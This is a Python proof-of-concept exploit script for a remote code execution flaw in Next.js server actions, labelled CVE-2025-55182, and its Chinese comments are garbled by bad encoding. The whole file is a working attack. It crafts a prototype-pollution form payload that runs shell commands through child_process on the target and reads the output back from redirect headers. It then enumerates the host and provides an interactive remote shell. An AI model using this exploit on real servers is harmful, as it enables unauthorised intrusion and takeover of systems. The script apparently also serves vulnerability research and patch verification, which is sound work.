#!/usr/bin/env python3
"""
CVE-2025-55182 æ¼æ´å¤ç° POC
å®Œå…¨æŒ‰ç…§ BurpSuite Extension Java ä»£ç é‡å†™

âš ï¸ è­¦å‘Šï¼šä»…ç”¨äºå®‰å…¨ç ”ç©¶ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ï¼
"""

import sys
import urllib.request
import urllib.error
import urllib.parse
import base64
import random
import string
import re
import ssl

# å¿½ç•¥ SSL è¯ä¹¦éªŒè¯
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE


def random_string(length=8):
    """ç”Ÿæˆéšæœºå­—ç¬¦ä¸²"""
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def build_payload(command):
    """
    æ„å»ºæ¼æ´åˆ©ç”¨ payload - å®Œå…¨æŒ‰ç…§ Java ä»£ç çš„æ–¹å¼
    """
    # ç‰¹æ®Šå‘½ä»¤ï¼šOS æ£€æµ‹
    if command == "OS_DETECT":
        js_code = "process.platform"
    else:
        # è½¬ä¹‰å‘½ä»¤ä¸­çš„ç‰¹æ®Šå­—ç¬¦ (ä¸ Java ä¸€è‡´)
        escaped_cmd = command.replace("\\", "\\\\").replace("'", "\\'")
        js_code = f"process.mainModule.require('child_process').execSync('{escaped_cmd}')"
    
    # æ„å»º prefix - ä¸ Java ä»£ç å®Œå…¨ä¸€è‡´
    prefix = (
        "var res='';"
        "try{"
        f"var out={js_code};"
        "res=Buffer.from(out.toString()).toString('base64');"
        "}catch(e){"
        "res=Buffer.from('Error:'+(e.message||e)).toString('base64');"
        "}"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
    )
    
    # è½¬ä¹‰ prefix ç”¨äºåµŒå…¥ JSON (ä¸ Java ä¸€è‡´: \\ -> \\\\, " -> \\", \n -> \\n)
    escaped_prefix = prefix.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
    
    # æ‰‹åŠ¨æ„å»º payload JSON - ä¸ Java ä»£ç å®Œå…¨ä¸€è‡´
    payload_json = (
        '{"then":"$1:__proto__:then",'
        '"status":"resolved_model",'
        '"reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}",'
        '"_response":{'
        f'"_prefix":"{escaped_prefix}",'
        '"_chunks":"$Q2",'
        '"_formData":{"get":"$1:constructor:constructor"}'
        '}}'
    )
    
    return payload_json


def build_request_body(payload_json):
    """æ„å»º multipart/form-data è¯·æ±‚ä½“ - ä¸ Java ä»£ç ä¸€è‡´"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    # å®Œå…¨æŒ‰ç…§ Java ä»£ç çš„æ ¼å¼
    body = f"------{boundary}\r\n"
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += payload_json + "\r\n"
    body += f"------{boundary}\r\n"
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += '"$@0"\r\n'
    body += f"------{boundary}\r\n"
    body += 'Content-Disposition: form-data; name="2"\r\n\r\n'
    body += '[]\r\n'
    body += f"------{boundary}--"
    
    return body, f"----{boundary}"


def extract_result(response_text, headers_dict):
    """ä»å“åº”ä¸­æå–æ‰§è¡Œç»“æœ"""
    # 1. æ£€æŸ¥é‡å®šå‘å¤´
    redirect_url = headers_dict.get('x-action-redirect', '') or headers_dict.get('location', '')
    
    if redirect_url and '?a=' in redirect_url:
        result = decode_result(redirect_url.split('?a=')[1])
        if result:
            return result
    
    # 2. åœ¨å“åº”ä½“ä¸­æŸ¥æ‰¾ /login?a= æ¨¡å¼
    pattern = r'/login\?a=([A-Za-z0-9+/=%]+)'
    matches = re.findall(pattern, response_text)
    for match in matches:
        result = decode_result(match)
        if result and not result.startswith('Error:') and result != '[object Object]':
            return result
    
    return None


def decode_result(encoded):
    """è§£ç  Base64 ç»“æœ"""
    try:
        # æ¸…ç†ç¼–ç å­—ç¬¦ä¸²
        encoded = encoded.split('&')[0].split(';')[0]
        encoded = urllib.parse.unquote(encoded)
        
        # è¡¥é½ Base64 padding
        padding = 4 - len(encoded) % 4
        if padding != 4:
            encoded += '=' * padding
        
        return base64.b64decode(encoded).decode('utf-8')
    except:
        return None


def execute_exploit(target_url, path, command):
    """æ‰§è¡Œæ¼æ´åˆ©ç”¨"""
    try:
        url = f"{target_url.rstrip('/')}{path}"
        
        payload_json = build_payload(command)
        body, boundary = build_request_body(payload_json)
        
        # è¯·æ±‚å¤´ - ä¸ Java ä»£ç ä¸€è‡´
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Next-Action': 'x',  # å…³é”®ï¼šåªéœ€è¦ 'x'
            'Connection': 'close',
        }
        
        req = urllib.request.Request(url, data=body.encode('utf-8'), headers=headers, method='POST')
        
        status_code = 0
        response_text = ""
        headers_dict = {}
        
        try:
            response = urllib.request.urlopen(req, timeout=15, context=ssl_context)
            status_code = response.status
            response_text = response.read().decode('utf-8', errors='ignore')
            headers_dict = {k.lower(): v for k, v in response.headers.items()}
        except urllib.error.HTTPError as e:
            status_code = e.code
            response_text = e.read().decode('utf-8', errors='ignore')
            headers_dict = {k.lower(): v for k, v in e.headers.items()}
        except Exception as e:
            return None
        
        # æ£€æŸ¥é‡å®šå‘çŠ¶æ€ç  (302, 303, 307 éƒ½æ˜¯æˆåŠŸçš„æ ‡å¿—)
        if status_code in [302, 303, 307]:
            result = extract_result(response_text, headers_dict)
            if result:
                return result
        
        # å°è¯•ä»å“åº”ä½“æå–
        result = extract_result(response_text, headers_dict)
        if result:
            return result
            
        return None
        
    except Exception as e:
        return None


def check_vulnerability(target_url):
    """æ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´"""
    # æµ‹è¯•è·¯å¾„åˆ—è¡¨ - /apps æ˜¯æœ€å¸¸è§çš„æ¼æ´è·¯å¾„
    paths = ["/apps", "/", "/en", "/api/action", "/login"]
    
    print("=" * 70)
    print("CVE-2025-55182 Next.js RCE æ¼æ´åˆ©ç”¨å·¥å…·")
    print("=" * 70)
    print(f"ç›®æ ‡åœ°å€: {target_url}")
    print()
    
    # ç”Ÿæˆéšæœºæµ‹è¯•å­—ç¬¦ä¸²
    test_string = random_string(8)
    test_command = f"echo {test_string}"
    
    vulnerable_path = None
    
    for path in paths:
        print(f"[*] æµ‹è¯•è·¯å¾„: {path} ", end="", flush=True)
        
        result = execute_exploit(target_url, path, test_command)
        
        if result:
            clean_result = result.strip()
            if test_string in clean_result:
                print(f"âœ… å‘ç°æ¼æ´!")
                vulnerable_path = path
                break
            else:
                print(f"å“åº”: {clean_result[:30]}...")
        else:
            print("âŒ")
    
    if vulnerable_path:
        print()
        print("=" * 70)
        print("ğŸ¯ æ¼æ´ç¡®è®¤! è·å–ç³»ç»Ÿä¿¡æ¯...")
        print("=" * 70)
        
        # è·å–ç”¨æˆ·ä¿¡æ¯
        print("\n[*] whoami:")
        user_result = execute_exploit(target_url, vulnerable_path, "whoami")
        if user_result:
            print(f"    {user_result.strip()}")
        
        # è·å–ç³»ç»Ÿä¿¡æ¯
        print("\n[*] æ“ä½œç³»ç»Ÿ:")
        os_result = execute_exploit(target_url, vulnerable_path, "OS_DETECT")
        if os_result:
            os_map = {"darwin": "macOS", "linux": "Linux", "win32": "Windows"}
            print(f"    {os_map.get(os_result.strip(), os_result.strip())}")
        
        # è·å–ä¸»æœºå
        print("\n[*] hostname:")
        hostname_result = execute_exploit(target_url, vulnerable_path, "hostname")
        if hostname_result:
            print(f"    {hostname_result.strip()}")
        
        # è·å– id
        print("\n[*] id:")
        id_result = execute_exploit(target_url, vulnerable_path, "id")
        if id_result:
            print(f"    {id_result.strip()[:100]}...")
        
        print()
        print("=" * 70)
        print("ğŸ’€ RCE æ¼æ´åˆ©ç”¨æˆåŠŸ!")
        print("=" * 70)
        
        return True, vulnerable_path
    else:
        print()
        print("=" * 70)
        print("âŒ æœªå‘ç°æ¼æ´")
        print("=" * 70)
        return False, None


def interactive_shell(target_url, path):
    """äº¤äº’å¼å‘½ä»¤æ‰§è¡Œ"""
    print()
    print("=" * 70)
    print("ğŸš äº¤äº’å¼ Shell (è¾“å…¥ 'exit' é€€å‡º)")
    print("=" * 70)
    
    while True:
        try:
            cmd = input("\n$ ").strip()
            if cmd.lower() == 'exit':
                break
            if not cmd:
                continue
                
            result = execute_exploit(target_url, path, cmd)
            if result:
                print(result.rstrip())
            else:
                print("[!] æ‰§è¡Œå¤±è´¥")
        except KeyboardInterrupt:
            break
    
    print("\n[*] é€€å‡º")


def open_calculator(target_url, path):
    """æ‰“å¼€è®¡ç®—å™¨"""
    print("\n[*] æ‰“å¼€è®¡ç®—å™¨...")
    
    # æ£€æµ‹æ“ä½œç³»ç»Ÿ
    os_result = execute_exploit(target_url, path, "OS_DETECT")
    if os_result:
        os_name = os_result.strip()
        
        if os_name == "darwin":
            cmd = "open -a Calculator"
        elif os_name == "win32":
            cmd = "calc.exe"
        elif os_name == "linux":
            cmd = "gnome-calculator || xcalc || kcalc &"
        else:
            print(f"[!] æœªçŸ¥ç³»ç»Ÿ: {os_name}")
            return
        
        print(f"[*] æ‰§è¡Œ: {cmd}")
        execute_exploit(target_url, path, cmd)
        print("[+] å‘½ä»¤å·²å‘é€!")
    else:
        print("[!] æ— æ³•æ£€æµ‹æ“ä½œç³»ç»Ÿ")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("CVE-2025-55182 Next.js RCE æ¼æ´åˆ©ç”¨å·¥å…·")
        print()
        print("ç”¨æ³•: python3 poc-cve-2025-55182.py <ç›®æ ‡> [é€‰é¡¹]")
        print()
        print("é€‰é¡¹:")
        print("  --calc     æ‰“å¼€è®¡ç®—å™¨")
        print("  --shell    äº¤äº’å¼ Shell")
        print()
        print("ç¤ºä¾‹:")
        print("  python3 poc-cve-2025-55182.py http://192.168.0.104:3000")
        print("  python3 poc-cve-2025-55182.py http://192.168.0.104:3000 --calc")
        print("  python3 poc-cve-2025-55182.py http://192.168.0.104:3000 --shell")
        sys.exit(1)
    
    target = sys.argv[1]
    
    is_vuln, vuln_path = check_vulnerability(target)
    
    if is_vuln and vuln_path:
        if "--calc" in sys.argv:
            open_calculator(target, vuln_path)
        elif "--shell" in sys.argv:
            interactive_shell(target, vuln_path)
